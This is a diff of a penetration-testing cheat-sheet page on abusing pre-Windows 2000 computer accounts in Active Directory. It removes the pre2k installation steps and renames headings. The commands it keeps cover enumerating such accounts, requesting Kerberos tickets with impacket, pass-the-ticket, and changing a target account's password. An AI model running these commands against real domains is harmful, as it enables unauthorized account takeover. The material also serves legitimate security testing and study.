@@ -1,36 +1,14 @@
 ---
 title: "Pre-Windows 2000 Computer"
-tags: ["Domain Controller", "Pre-Windows 2000 Computer", "Active Directory", "Windows", "pre2k", "Pre-Created Computer", "STATUS_PASSWORD_MUST_CHANGE"]
+tags: ["Active Directory", "Pre-Windows 2000 Computer", "Domain Controller", "Pre-Created Computer", "STATUS_PASSWORD_MUST_CHANGE", "Windows", "pre2k"]
 ---
 
-### Enum
+{{< filter_buttons >}}
+
+### Enumeration
 
 {{< tab set1 tab1 >}}pre2k{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
-
-#### Installation
-
-```console
-python3 -m venv venv
-```
-
-```console
-source venv/bin/activate
-```
-
-```console
-git clone https://github.com/garrettfoster13/pre2k.git
-```
-
-```console
-cd pre2k/
-```
-
-```console
-pip3 install .
-```
-
-#### Query
 
 ```console
 # Unauth
@@ -91,7 +69,7 @@ $ pre2k auth -u trainee -p trainee -d example.com -dc-ip 192.168.1.10 -verbose
 
 {{< /tabcontent >}}
 
-### Abuse #1: Connect via Kerberos
+### Connect via Kerberos
 
 {{< tab set2 tab1 >}}impacket{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
@@ -99,6 +77,7 @@ $ pre2k auth -u trainee -p trainee -d example.com -dc-ip 192.168.1.10 -verbose
 #### 1. Request a Ticket
 
 ```console
+# Password
 sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
@@ -110,17 +89,19 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 ```console
+# Pass-the-ticket
 export KRB5CCNAME='<USER>.ccache'
 ```
 
 {{< /tabcontent >}}
 
-### Abuse #2: Change Target Password
+### Change Target Password
 
 {{< tab set3 tab1 >}}impacket{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
 ```console
+# Password
 impacket-changepasswd -newpass '<NEW_PASSWORD>' '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -protocol rpc-samr
 ```
 
